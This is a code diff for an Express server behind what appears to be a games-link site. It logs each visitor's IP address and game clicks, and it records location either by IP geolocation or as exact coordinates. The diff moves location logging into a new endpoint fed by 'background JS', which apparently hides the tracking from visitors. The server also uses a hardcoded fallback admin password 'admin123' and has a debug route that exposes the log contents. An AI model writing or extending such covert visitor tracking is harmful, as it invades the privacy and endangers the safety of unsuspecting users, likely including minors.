@@ -2,14 +2,12 @@
 const express = require('express');
 const fs      = require('fs');
 const path    = require('path');
-
 const app     = express();
 
-const PORT = process.env.PORT || 10000;   // Render auto‑sets this
-const HOST = '0.0.0.0';                   // must bind all interfaces
+const PORT = process.env.PORT || 10000;
+const HOST = '0.0.0.0';
 
 const ADMIN_PASS = process.env.ADMIN_PASS || 'admin123';
-
 const LOG_DIR  = path.join(__dirname, 'logs');
 const LOG_FILE = path.join(LOG_DIR, 'ip-log.txt');
 
@@ -32,20 +30,15 @@ async function estimateLocationByIP(ip) {
   } catch (e) {}
   return null;
 }
-
 /* util: ip logger (updated for location logic) */
 async function logIP(req, label = 'visited') {
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
   const ts = new Date().toISOString();
   let locString = '';
-
-  // Accepts POSTed location data if provided
   const { latitude, longitude, exact_location } = req.body || {};
-
   if (latitude && longitude && exact_location === 'yes') {
     locString = ` | location: ${latitude},${longitude} | exact: yes`;
   } else if (exact_location === 'no') {
-    // Try to estimate by IP
     const loc = await estimateLocationByIP(ip);
     if (loc) {
       locString = ` | location: ${loc.latitude},${loc.longitude} (${loc.city},${loc.country}) | exact: no`;
@@ -53,7 +46,6 @@ async function logIP(req, label = 'visited') {
       locString = ' | location: unknown | exact: no';
     }
   }
-
   fs.appendFile(LOG_FILE, `${ts} - ${ip} ${label}${locString}\n`, err =>
     err && console.error('Log error:', err)
   );
@@ -64,15 +56,18 @@ async function logIP(req, label = 'visited') {
 app.get('/',        (_,res)=> res.redirect('/intro'));
 app.get('/intro',   (_,res)=> res.sendFile(path.join(__dirname,'public','intro.html')));
 
-// Home page now supports both GET and POST for location logging
 app.get('/home',  (req,res)=> {
-  // For GET, no location info, just log as before
-  logIP(req,'visited /home');
+  // Just serve the page, do not log here!
   res.sendFile(path.join(__dirname,'public','home.html'));
 });
-app.post('/home', async (req,res) => {
-  await logIP(req,'visited /home');
+// Don't POST to /home for logging, just serve the page if you need POST for form use-cases
+app.post('/home', (req,res)=> {
   res.sendFile(path.join(__dirname,'public','home.html'));
+});
+// Logging endpoint for background JS
+app.post('/log-location', express.urlencoded({ extended: true }), async (req, res) => {
+  await logIP(req, 'visited /home');
+  res.sendStatus(204);
 });
 
 /* pretty game routes ( /templerun → /games/templerun ) */
@@ -84,14 +79,12 @@ app.post('/home', async (req,res) => {
 app.get('/games/:game',async (req,res)=>{
   const game = req.params.game.toLowerCase();
   await logIP(req,`clicked game: ${game}`);
-
   const map = {
     templerun : 'https://githubshrub.github.io/html5-games/games/templerun2/',
     speedstars: 'https://speedstarsfree.github.io/',
     subway    : 'https://dddavit.github.io/subway/',
     candy     : 'https://candy-crush-online.github.io/'
   };
-
   return map[game]
     ? res.redirect(map[game])
     : res.status(404).send(`<h1>Unknown game: ${game}</h1>`);
@@ -122,7 +115,5 @@ app.get('/debug/log-contents',(_,res)=>{
 const server = app.listen(PORT, HOST, ()=> {
   console.log(`Server listening on http://${HOST}:${PORT}`);
 });
-
-/* optional: bump keep‑alive */
 server.keepAliveTimeout = 120_000;
 server.headersTimeout   = 121_000;
